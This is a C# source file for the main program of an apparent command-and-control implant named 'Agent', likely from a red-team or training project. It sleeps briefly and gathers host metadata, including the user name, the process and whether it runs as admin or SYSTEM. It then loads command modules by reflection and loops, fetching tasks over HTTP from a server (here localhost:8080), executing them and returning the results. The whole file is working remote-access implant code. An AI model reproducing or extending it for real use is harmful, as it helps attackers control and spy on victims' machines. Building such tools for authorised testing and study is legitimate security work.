using Agent.Models;

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Threading;

namespace Agent
{
    internal class Program
    {
        private static AgentMetaData _metadata;
        private static CommModule _commModule;

        private static CancellationTokenSource _tokenSource;

        private static List<AgentCommand> _commands = new List<AgentCommand>();

        static void Main(string[] args)
        {
            Thread.Sleep(10000);

            GenerateMetadata();
            LoadAgentCommands();

            _commModule = new HttpCommModule("localhost", 8080);
            _commModule.Init(_metadata);
            _commModule.Start();

            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                if (_commModule.RecvData(out var tasks))
                {
                    HandleTasks(tasks);
                }
            }
        }

        private static void HandleTasks(IEnumerable<AgentTask> tasks)
        {
            foreach (var task in tasks)
            {
                HandleTask(task);
            }
        }

        private static void HandleTask(AgentTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command));
            if (command is null) return;

            try
            {
                var result = command.Execute(task);
                SendTaskResult(task.Id, result);
            }
            catch (Exception ex)
            {
                SendTaskResult(task.Id, ex.Message);
            }
        }

        private static void SendTaskResult(string taskId, string result)
        {
            var taskResult = new AgentTaskResult
            {
                Id = taskId,
                Result = result
            };

            _commModule.SendData(taskResult);
        }

        public void Stop()
        {
            _tokenSource.Cancel();
        }

        private static void LoadAgentCommands()
        {
            var self = Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)))
                {
                    var instance = (AgentCommand) Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            }
        }

        static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);

            string integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }

            _metadata = new AgentMetaData()
            {
                Id = Guid.NewGuid().ToString(),
                HostName = Environment.MachineName, // Alter this to pull Hostname from DNS for more reliable return
                UserName = identity.Name,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };

            process.Dispose();
            identity.Dispose();
        }
    }
}
